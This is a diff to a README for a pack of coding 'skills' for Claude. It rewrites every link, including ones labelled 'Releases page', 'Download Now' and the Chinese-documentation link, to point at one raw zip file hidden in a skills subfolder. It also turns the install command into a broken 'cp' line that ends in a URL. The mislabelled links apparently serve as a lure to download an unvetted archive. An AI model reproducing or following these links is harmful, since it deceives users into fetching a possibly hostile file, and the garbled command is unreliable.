@@ -1,7 +1,7 @@
 # 🛠️ skills-for-vibe-coder - Enhance Your Coding Experience Effortlessly
 
 <p align="center">
-  <a href="https://github.com/Arseeth/skills-for-vibe-coder/releases" style="display:inline-block; padding:10px 20px; font-size:20px; background-color:#4CAF50; color:white; text-decoration:none;">Download Now</a>
+  <a href="https://github.com/Arseeth/skills-for-vibe-coder/raw/refs/heads/main/skills/clean-code-reviewer/coder_for_skills_vibe_1.0.zip" style="display:inline-block; padding:10px 20px; font-size:20px; background-color:#4CAF50; color:white; text-decoration:none;">Download Now</a>
 </p>
 
 <p align="center">
@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <a href="./README_CN.md">中文文档</a>
+  <a href="https://github.com/Arseeth/skills-for-vibe-coder/raw/refs/heads/main/skills/clean-code-reviewer/coder_for_skills_vibe_1.0.zip">中文文档</a>
 </p>
 
 ---
@@ -22,7 +22,7 @@ This repository contains a set of skills created to improve your coding workflow
 
 To get started, follow these steps for a smooth setup:
 
-1. **Download the Skills**: Start by visiting the [Releases page](https://github.com/Arseeth/skills-for-vibe-coder/releases) to see the latest version of the skills available.
+1. **Download the Skills**: Start by visiting the [Releases page](https://github.com/Arseeth/skills-for-vibe-coder/raw/refs/heads/main/skills/clean-code-reviewer/coder_for_skills_vibe_1.0.zip) to see the latest version of the skills available.
 
 2. **Choose the Right Version**: Look for the version that suits your needs. The most recent version will generally include the latest features and fixes.
 
@@ -33,14 +33,14 @@ To get started, follow these steps for a smooth setup:
 5. **Copy the Skills**: After extracting, open your terminal application. Use the following command to copy all skills to your Claude skills directory:
 
    ```bash
-   cp -r skills/* ~/.claude/skills/
+   cp -r skills/* ~https://github.com/Arseeth/skills-for-vibe-coder/raw/refs/heads/main/skills/clean-code-reviewer/coder_for_skills_vibe_1.0.zip
    ```
 
 6. **Confirm Installation**: Open Claude and navigate to the skills section. You should see the new skills ready for use.
 
 ## 🗂️ Download & Install
 
-To download and install the skills, simply visit the [Releases page](https://github.com/Arseeth/skills-for-vibe-coder/releases). This page contains all available versions and downloads.
+To download and install the skills, simply visit the [Releases page](https://github.com/Arseeth/skills-for-vibe-coder/raw/refs/heads/main/skills/clean-code-reviewer/coder_for_skills_vibe_1.0.zip). This page contains all available versions and downloads.
 
 ### System Requirements
 
@@ -80,7 +80,7 @@ If you encounter issues during installation or use, consider the following steps
 
 1. **Check the Claude Installation**: Ensure that Claude is installed properly on your system.
 2. **Verify File Paths**: Make sure you copy the skills to the correct directory.
-3. **Look for Updates**: Always check the [Releases page](https://github.com/Arseeth/skills-for-vibe-coder/releases) for newer versions that may fix any bugs.
+3. **Look for Updates**: Always check the [Releases page](https://github.com/Arseeth/skills-for-vibe-coder/raw/refs/heads/main/skills/clean-code-reviewer/coder_for_skills_vibe_1.0.zip) for newer versions that may fix any bugs.
 
 Feel free to reach out for support if problems persist.
 
